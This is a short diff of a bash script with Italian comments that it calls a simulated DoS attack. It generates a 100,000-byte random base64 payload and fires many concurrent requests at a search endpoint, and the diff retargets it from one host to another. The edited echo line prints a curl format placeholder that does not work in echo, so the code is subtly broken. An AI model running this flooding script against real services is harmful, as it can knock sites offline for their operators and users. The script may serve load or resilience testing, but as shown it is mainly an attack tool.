@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # URL della rotta da attaccare
-URL="http://external.user:8000/articles/search"
+URL="http://cyber.blog:8000/articles/search"
 
 # Generare un grande payload casuale
 LARGE_PAYLOAD=$(head -c 100000 < /dev/urandom | base64)
@@ -20,7 +20,7 @@ echo "Inizio attacco DoS simulato..."
 for ((i=1; i<=NUM_REQUESTS; i++))
 do
     send_request &
-    echo "Richiesta $i inviata"
+    echo "Richiesta $i -> HTTP Status: %{http_code}"
 done
 
 echo "Attacco DoS simulato completato!"
